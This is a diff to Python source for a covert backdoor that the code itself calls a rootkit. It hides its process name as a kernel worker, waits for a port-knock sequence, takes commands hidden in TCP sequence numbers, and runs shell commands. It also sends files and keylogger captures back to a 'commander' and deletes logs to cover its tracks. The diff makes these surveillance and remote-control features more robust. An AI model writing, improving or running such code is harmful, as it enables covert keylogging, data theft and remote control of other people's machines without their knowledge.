@@ -8,6 +8,8 @@ import random
 import threading
 import subprocess
 from scapy.all import IP, TCP, sniff, send
+
+# Import Keylogger from the provided file
 from keylogger import Keylogger
 
 class Victim:
@@ -16,28 +18,32 @@ class Victim:
         self.tx_port = None
         self.rx_port = None
         self.commander_ip = None
+        self.session_lock = threading.Lock()
         self.keylogger = None
         self.keylogger_thread = None
+        self.watcher_thread = None
         self.running = True
         self.command_buffer = ""
+        self.keylogger_active = False  # Track keylogger state
         
+        # Concealment: Change process name
         self.conceal_process()
 
     def conceal_process(self):
-        """Conceal process name."""
+        """Attempts to conceal the process name."""
         try:
             sys.argv[0] = "[kworker/u]"
             try:
                 import prctl
                 prctl.set_name("[kworker/u]")
-                print("[*] Process concealed (prctl)")
+                print("[*] Process concealed using prctl")
             except ImportError:
-                print("[*] Process concealed (argv[0] only)")
+                print("[*] Process name concealed (argv[0] only)")
         except Exception as e:
             print(f"[!] Concealment limited: {e}")
 
     def _generate_expected_sequence(self, target_ip):
-        """Generate expected knock sequence (must match port_knocker.py)."""
+        """Replicates PortKnocker logic to validate the knock sequence."""
         try:
             ip_u32 = struct.unpack("!I", socket.inet_aton(target_ip))[0]
         except socket.error:
@@ -60,7 +66,7 @@ class Victim:
         return knocks, tx_port, rx_port
 
     def wait_for_knock(self):
-        """Wait for port knock sequence."""
+        """Sniffs for the port knock sequence to initiate session."""
         print("[*] Waiting for port knock sequence...")
         print("[*] Process concealed. Waiting for commander...")
         
@@ -68,6 +74,7 @@ class Victim:
         self.expected_knocks = []
         self.temp_tx = None
         self.temp_rx = None
+        self.knock_source_ip = None
         self.last_knock_time = 0
         
         def process_knock(pkt):
@@ -83,6 +90,8 @@ class Victim:
             
             current_time = time.time()
             if current_time - self.last_knock_time > 30:
+                if self.knock_state > 0:
+                    print(f"[!] Timeout - resetting knock sequence")
                 self.knock_state = 0
                 self.expected_knocks = []
             
@@ -98,6 +107,7 @@ class Victim:
 
             if dport == self.expected_knocks[self.knock_state]:
                 self.knock_state += 1
+                self.knock_source_ip = src_ip
                 print(f"[*] Knock {self.knock_state}/3 on port {dport}")
                 
                 if self.knock_state >= 3:
@@ -115,13 +125,15 @@ class Victim:
             
             return False
 
-        sniff(filter="tcp[tcpflags] & tcp-syn != 0", 
-              prn=process_knock, 
-              stop_filter=lambda x: self.is_connected,
-              store=0)
+        sniff(
+            filter="tcp[tcpflags] & tcp-syn != 0", 
+            prn=process_knock, 
+            stop_filter=lambda x: self.is_connected,
+            store=0
+        )
 
     def send_covert_response(self, message):
-        """Send data to Commander via TCP Sequence Numbers."""
+        """Sends data back to Commander using TCP Sequence Numbers."""
         if not self.commander_ip or not self.rx_port:
             return
             
@@ -136,11 +148,11 @@ class Victim:
                 send(pkt, verbose=False)
                 time.sleep(0.01)
             except Exception as e:
-                print(f"[!] Send error: {e}")
+                print(f"[!] Error sending packet: {e}")
                 break
 
     def command_listener(self):
-        """Listen for covert commands on tx_port."""
+        """Listens for covert commands on tx_port."""
         def process_packet(pkt):
             if pkt.haslayer(TCP) and pkt[TCP].dport == self.tx_port:
                 char_code = pkt[TCP].seq % 256
@@ -157,11 +169,13 @@ class Victim:
                       timeout=2, 
                       count=0,
                       store=0)
-            except Exception:
+            except Exception as e:
+                if self.running:
+                    print(f"[!] Sniffer error: {e}")
                 pass
 
     def handle_command(self, raw_cmd):
-        """Parse and execute commands from Commander."""
+        """Parses and executes commands received from Commander."""
         if not raw_cmd:
             return
             
@@ -178,11 +192,9 @@ class Victim:
             
         elif cmd_type == "START_KEY":
             self.start_keylogger()
-            self.send_covert_response("Keylogger started.\n")
             
         elif cmd_type == "STOP_KEY":
             self.stop_keylogger()
-            self.send_covert_response("Keylogger stopped. Log deleted.\n")
             
         elif cmd_type == "GET_LOG":
             self.send_keylog()
@@ -204,39 +216,53 @@ class Victim:
             self.uninstall()
 
     def start_keylogger(self):
-        """Start keylogger in background thread."""
-        if self.keylogger_thread and self.keylogger_thread.is_alive():
+        """Start the keylogger in a background thread."""
+        if self.keylogger_active:
             self.send_covert_response("Keylogger already running.\n")
             return
             
         try:
-            self.keylogger = Keylogger()
+            self.keylogger = Keylogger(log_path="./data/captured_keys.txt")
             self.keylogger_thread = threading.Thread(
                 target=self.keylogger.run, 
                 daemon=True
             )
             self.keylogger_thread.start()
+            self.keylogger_active = True
+            self.send_covert_response("Keylogger started.\n")
             print("[*] Keylogger thread started")
         except Exception as e:
             self.send_covert_response(f"Keylogger error: {e}\n")
+            print(f"[!] Keylogger error: {e}")
 
     def stop_keylogger(self):
-        """Stop keylogger AND delete the log file."""
-        if self.keylogger_thread and self.keylogger_thread.is_alive():
-            self.keylogger_thread = None
-            print("[*] Keylogger thread stopped")
+        """Stop the keylogger and delete the log file."""
+        if not self.keylogger_active:
+            self.send_covert_response("Keylogger not running.\n")
+            print("[*] No keylogger thread running")
+            return
         
-        # DELETE THE LOG FILE
+        # Stop tracking (thread is daemon, will stop when main exits)
+        self.keylogger_active = False
+        self.keylogger_thread = None
+        
+        # Delete the log file to cover tracks
+        log_path = "./data/captured_keys.txt"
         try:
-            log_path = "./data/captured_keys.txt"
             if os.path.exists(log_path):
                 os.remove(log_path)
-                print(f"[*] Log file deleted: {log_path}")
+                print(f"[*] Keylog file deleted: {log_path}")
+                self.send_covert_response("Keylogger stopped. Log deleted.\n")
+            else:
+                self.send_covert_response("Keylogger stopped. No log file found.\n")
         except Exception as e:
-            print(f"[!] Error deleting log: {e}")
+            print(f"[!] Error deleting log file: {e}")
+            self.send_covert_response(f"Error deleting log: {e}\n")
+        
+        print("[*] Keylogger thread stopped")
 
     def send_keylog(self):
-        """Send keylog file contents to commander."""
+        """Send the keylog file contents to commander."""
         log_path = "./data/captured_keys.txt"
         
         if os.path.exists(log_path):
@@ -245,9 +271,9 @@ class Victim:
                     content = f.read()
                 
                 if content:
-                    self.send_covert_response(f"=== KEYLOG START ===\n")
+                    self.send_covert_response("=== KEYLOG START ===\n")
                     self.send_covert_response(content)
-                    self.send_covert_response(f"=== KEYLOG END ===\n")
+                    self.send_covert_response("=== KEYLOG END ===\n")
                 else:
                     self.send_covert_response("Keylog file is empty.\n")
             except Exception as e:
@@ -256,7 +282,7 @@ class Victim:
             self.send_covert_response("No log file found. Start keylogger first.\n")
 
     def execute_command(self, cmd):
-        """Execute shell command and send output."""
+        """Execute a shell command and send output back."""
         try:
             result = subprocess.run(
                 cmd, 
@@ -269,11 +295,13 @@ class Victim:
             if not output:
                 output = "Command executed (no output).\n"
             self.send_covert_response(output)
+        except subprocess.TimeoutExpired:
+            self.send_covert_response("Command timed out (30s limit).\n")
         except Exception as e:
-            self.send_covert_response(f"Error: {str(e)}\n")
+            self.send_covert_response(f"Execution Error: {str(e)}\n")
 
     def transfer_file_to_commander(self, filename):
-        """Send file from victim to commander."""
+        """Send a file from victim to commander."""
         try:
             if os.path.exists(filename):
                 with open(filename, "r") as f:
@@ -281,14 +309,14 @@ class Victim:
                 
                 self.send_covert_response(f"=== FILE: {filename} ===\n")
                 self.send_covert_response(content)
-                self.send_covert_response(f"=== TRANSFER COMPLETE ===\n")
+                self.send_covert_response("=== TRANSFER COMPLETE ===\n")
             else:
-                self.send_covert_response(f"Error: File not found.\n")
+                self.send_covert_response(f"Error: File {filename} not found.\n")
         except Exception as e:
             self.send_covert_response(f"Error: {str(e)}\n")
 
     def receive_file(self, filename):
-        """Prepare to receive file from commander."""
+        """Prepare to receive a file from commander."""
         try:
             dir_path = os.path.dirname(filename)
             if dir_path:
@@ -298,11 +326,12 @@ class Victim:
                 pass
             
             self.send_covert_response(f"File {filename} created.\n")
+            print(f"[*] File {filename} ready for data")
         except Exception as e:
-            self.send_covert_response(f"Error: {str(e)}\n")
+            self.send_covert_response(f"Error creating file: {str(e)}\n")
 
     def start_watcher(self, path):
-        """Watch file/directory for changes."""
+        """Watch a file or directory for changes."""
         def watch_loop():
             last_stat = None
             while self.running and self.is_connected:
@@ -310,34 +339,43 @@ class Victim:
                     if os.path.exists(path):
                         stat = os.stat(path)
                         if last_stat and stat.st_mtime != last_stat.st_mtime:
-                            msg = f"[CHANGE] {path}\n"
+                            msg = f"[CHANGE DETECTED] {path}\n"
                             self.send_covert_response(msg)
                         last_stat = stat
+                    else:
+                        if last_stat:
+                            self.send_covert_response(f"[DELETED] {path}\n")
+                            last_stat = None
                     time.sleep(5)
                 except Exception:
                     pass
         
-        watcher = threading.Thread(target=watch_loop, daemon=True)
-        watcher.start()
+        self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
+        self.watcher_thread.start()
+        print(f"[*] Watching {path}")
 
     def uninstall(self):
-        """Remove rootkit."""
-        self.send_covert_response("Uninstalling...\n")
+        """Remove the rootkit."""
+        self.send_covert_response("Uninstalling rootkit...\n")
         self.running = False
         
-        # Delete keylog
+        # Remove keylog file
         try:
-            if os.path.exists("./data/captured_keys.txt"):
-                os.remove("./data/captured_keys.txt")
+            log_path = "./data/captured_keys.txt"
+            if os.path.exists(log_path):
+                os.remove(log_path)
+                print("[*] Keylog file removed")
         except Exception:
             pass
         
+        print("[*] Rootkit uninstalled")
         os._exit(0)
 
     def run(self):
         """Main victim loop."""
         if os.geteuid() != 0:
-            print("[!] WARNING: Run with sudo for full functionality.")
+            print("[!] WARNING: Root privileges recommended for keylogger and sniffing.")
+            print("[!] Some features may not work without sudo.")
         
         print("[*] Victim starting...")
         print(f"[*] PID: {os.getpid()}")
@@ -355,6 +393,8 @@ class Victim:
             except KeyboardInterrupt:
                 print("\n[*] Victim stopping...")
                 self.running = False
+        else:
+            print("[!] Session not established.")
 
 if __name__ == "__main__":
     victim = Victim()
